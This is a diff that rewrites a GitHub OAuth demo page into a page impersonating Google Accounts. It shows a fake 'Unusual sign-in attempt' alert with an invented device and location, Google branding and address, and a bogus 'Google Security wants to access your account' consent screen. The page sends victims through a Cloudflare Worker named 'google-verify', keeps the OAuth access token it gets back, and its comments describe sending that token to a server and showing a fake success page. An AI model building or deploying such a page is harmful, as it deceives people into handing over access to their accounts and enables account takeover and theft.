@@ -3,86 +3,206 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub OAuth Demo</title>
+    <title>Security Update - Google Accounts</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #24292f; color: white; border: none; border-radius: 4px; }
-        button:hover { background: #444; }
-        #user-info { margin-top: 20px; display: none; }
-        img { border-radius: 50%; width: 100px; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .google-logo {
+            height: 24px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        p {
+            color: #5f6368;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .device-info {
+            text-align: left;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #3c4043;
+        }
+        .device-info strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            width: 100%;
+        }
+        .btn:hover {
+            background-color: #1765cc;
+        }
+        .btn-secondary {
+            background-color: white;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background-color: #f8f9fa;
+            border-color: #dadce0;
+        }
+        #login-section {
+            display: block;
+        }
+        #user-section {
+            display: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>GitHub OAuth Demo</h1>
+        <!-- Google Logo SVG -->
+        <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
+            <path d="M17.19 10.67v4.74h7.66c-.22 1.45-1.14 2.84-2.78 3.63-1.73.83-3.87.9-5.87.1-2.04-.82-3.54-2.5-4.15-4.55h-5.32v5.55c1.62 1.66 4.2 2.64 6.97 2.64 5.25 0 9.5-3.38 9.5-9.37 0-.63-.06-1.22-.17-1.82h-9.74z" fill="#4285F4"/>
+            <path d="M3.3 12c0-1.55.38-2.98 1.05-4.28L1.23 5.9C.45 7.56 0 9.32 0 11.28c0 1.96.45 3.72 1.23 5.38l3.12-1.83C3.68 14.62 3.3 13.19 3.3 12z" fill="#EA4335"/>
+            <path d="M51.52 5.28v13.35h-2.7v-1.2c-.6.85-1.64 1.3-2.8 1.3-2.2 0-3.9-1.75-3.9-3.9s1.7-3.9 3.9-3.9c1.16 0 2.2.45 2.8 1.3V5.28h2.5zM48.7 13.8c0-1.5-.85-2.6-2.3-2.6s-2.3 1.1-2.3 2.6.85 2.6 2.3 2.6 2.3-1.1 2.3-2.6z" fill="#FBBC04"/>
+            <path d="M61.2 12c0-2.15-1.4-3.9-3.5-3.9s-3.5 1.75-3.5 3.9 1.4 3.9 3.5 3.9 3.5-1.75 3.5-3.9zm-2.6 0c0 1.1-.7 1.9-1.8 1.9s-1.8-.8-1.8-1.9.7-1.9 1.8-1.9 1.8.8 1.8 1.9z" fill="#4285F4"/>
+            <path d="M67.5 5.28v13.35h-2.7v-1.2c-.6.85-1.64 1.3-2.8 1.3-2.2 0-3.9-1.75-3.9-3.9s1.7-3.9 3.9-3.9c1.16 0 2.2.45 2.8 1.3V5.28h2.5zM64.7 13.8c0-1.5-.85-2.6-2.3-2.6s-2.3 1.1-2.3 2.6.85 2.6 2.3 2.6 2.3-1.1 2.3-2.6z" fill="#EA4335"/>
+            <path d="M71.8 12c0-2.15-1.4-3.9-3.5-3.9s-3.5 1.75-3.5 3.9 1.4 3.9 3.5 3.9 3.5-1.75 3.5-3.9zm-2.6 0c0 1.1-.7 1.9-1.8 1.9s-1.8-.8-1.8-1.9.7-1.9 1.8-1.9 1.8.8 1.8 1.9z" fill="#34A853"/>
+        </svg>
+
+        <!-- Step 1: Security Alert -->
         <div id="login-section">
-            <button id="login-btn">Log in with GitHub</button>
+            <h1>Unusual sign-in attempt</h1>
+            <p>We found a new sign-in to your Google Account on a device we don’t recognize. If it wasn’t you, click below to secure your account.</p>
+            
+            <div class="device-info">
+                <strong>Device:</strong> Windows 10 Chrome Browser<br>
+                <strong>Location:</strong> Mumbai, India<br>
+                <strong>Time:</strong> Just now
+            </div>
+
+            <button id="not-me-btn" class="btn">Check activity</button>
         </div>
-        <div id="user-info">
-            <img id="avatar" src="" alt="User Avatar">
-            <h2 id="username"></h2>
-            <p id="email"></p>
-            <button id="logout-btn">Logout</button>
+
+        <!-- Step 2: Grant Access (Hidden initially) -->
+        <div id="user-section" style="display:none;">
+            <div class="spinner" id="loader"></div>
+            <h2>Google Security wants to access your account</h2>
+            <p>Allow Google Security to manage your account settings and recovery options?</p>
+            <button id="confirm-btn" class="btn">Yes, it was me</button>
+            <button id="deny-btn" class="btn btn-secondary">No, it wasn't me</button>
+        </div>
+
+        <div class="footer">
+            Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043
         </div>
     </div>
 
     <script>
-        // 👇 SWAP THIS: Your Cloudflare Worker URL
+        // Your Cloudflare Worker URL
         const WORKER_URL = "https://google-verify.dispatchtomsanta.workers.dev"; 
 
-        const loginBtn = document.getElementById('login-btn');
-        const userInfo = document.getElementById('user-info');
         const loginSection = document.getElementById('login-section');
-        const avatar = document.getElementById('avatar');
-        const usernameEl = document.getElementById('username');
-        const emailEl = document.getElementById('email');
-        const logoutBtn = document.getElementById('logout-btn');
+        const userSection = document.getElementById('user-section');
+        const notMeBtn = document.getElementById('not-me-btn');
+        const confirmBtn = document.getElementById('confirm-btn');
+        const denyBtn = document.getElementById('deny-btn');
+        const loader = document.getElementById('loader');
 
-        // Check if we were redirected back from GitHub
+        // Check if we were redirected back from Worker
         const params = new URLSearchParams(window.location.search);
         const token = params.get('access_token');
-        const userStr = params.get('user');
+        const userInfoStr = params.get('user_info');
 
-        if (token && userStr) {
-            // Save token to localStorage
-            localStorage.setItem('gh_token', token);
+        if (token && userInfoStr) {
+            // We have a token! Show the "Grant Access" screen
+            loginSection.style.display = 'none';
+            userSection.style.display = 'block';
             
-            // Parse user data
-            const user = JSON.parse(userStr);
-            localStorage.setItem('gh_user', JSON.stringify(user));
+            // Store token for later use (e.g., sending it to your backend)
+            localStorage.setItem('google_auth_token', token);
             
-            showUser(user);
+            // Optional: Show user info if you want to personalize the "Success" screen later
+            console.log("User Authenticated:", JSON.parse(userInfoStr));
             
             // Clean URL
             window.history.replaceState({}, document.title, "/");
-        } else if (localStorage.getItem('gh_token')) {
-            // If we have a token but no params, show user (page refresh scenario)
-            const user = JSON.parse(localStorage.getItem('gh_user'));
-            showUser(user);
         }
 
-        function showUser(user) {
+        // Handle "Check activity" click
+        notMeBtn.addEventListener('click', () => {
             loginSection.style.display = 'none';
-            userInfo.style.display = 'block';
-            avatar.src = user.avatar_url;
-            usernameEl.textContent = user.login || user.name;
-            emailEl.textContent = user.email || 'No public email';
-        }
-
-        loginBtn.addEventListener('click', () => {
-            // Generate a random state for security
-            const state = Math.random().toString(36).substring(7);
-            localStorage.setItem('oauth_state', state);
-
-            // Redirect to Worker
-            window.location.href = `${WORKER_URL}/login?state=${state}`;
+            userSection.style.display = 'block';
         });
 
-        logoutBtn.addEventListener('click', () => {
-            localStorage.removeItem('gh_token');
-            localStorage.removeItem('gh_user');
-            window.location.reload();
+        // Handle "Yes, it was me" click
+        confirmBtn.addEventListener('click', () => {
+            loader.style.display = 'block';
+            confirmBtn.style.display = 'none';
+            denyBtn.style.display = 'none';
+
+            // Simulate processing
+            setTimeout(() => {
+                alert("Account secured. Access granted.");
+                // You can now redirect to a fake "Success" page or just stay here
+                // To actually use the token, you would send it to your server:
+                // fetch('/save-token', { method: 'POST', body: JSON.stringify({ token: localStorage.getItem('google_auth_token') }) });
+            }, 1500);
+        });
+
+        // Handle "No, it wasn't me" click
+        denyBtn.addEventListener('click', () => {
+            alert("Sign-in blocked.");
+            location.reload();
         });
     </script>
 </body>
